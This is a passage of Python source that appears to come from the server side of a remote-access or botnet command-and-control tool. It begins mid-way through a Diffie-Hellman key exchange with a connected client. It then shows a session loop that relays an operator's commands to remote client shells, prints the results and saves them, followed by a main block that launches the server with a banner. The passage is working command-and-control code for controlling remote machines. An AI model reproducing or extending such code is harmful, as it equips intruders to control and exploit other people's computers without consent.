            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self.connection.send(long_to_bytes(xA))
            xB = bytes_to_long(self.connection.recv(256))
            x  = pow(xB, a, p)
            y  = SHA256.new(long_to_bytes(x)).hexdigest()
            return threads['server']._obfuscate(y)
        except Exception as e:
            self._error("{} returned error: {}".format(self._diffiehellman, str(e)))
            self._kill()

    def run(self):
        while True:
            try:
                if threads['server'].exit_status:
                    break
                task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
                self.shell.wait()
                if type(task) is dict:
                    if 'prompt' in task.get('task'):
                        self.prompt     = task
                        command         = self._prompt(bytes(self.prompt.get('data')).format(self.name))
                        cmd, _, action  = bytes(command).partition(' ')
                        if cmd in threads['server'].commands and cmd != 'help':
                            result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
                            if result:
                                threads['server']._print(result)
                                self.shell.clear()
                                threads['server'].save_task_results(task)
                                self.shell.set()
                            continue
                        else:
                            threads['server'].send_client(command, self.name)
                    elif 'help' in task.get('task'):
                        self.shell.clear()
                        threads['server'].show_usage_help(data=task.get('data'))
                        self.shell.set()
                    elif 'standby' in task.get('task'):
                        print(task.get('data'))
                        break
                    else:
                        if task.get('data'):
                            threads['server']._print(task['data'])
                            threads['server'].save_task_results(task)
                self.prompt = None
            except Exception as e:
                self._error(str(e))
                break
        self._kill()


if __name__ == '__main__':
    port    = int(PORT)
    threads = {}
    threads['server'] = ServerThread(port)
    os.system('cls' if os.name is 'nt' else 'clear')
    print(threads['server']._rand_color() + BANNER + colorama.Fore.WHITE)
    print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.RESET + "Use 'help' for command usage information\n\n")
    threads['server'].start()
 
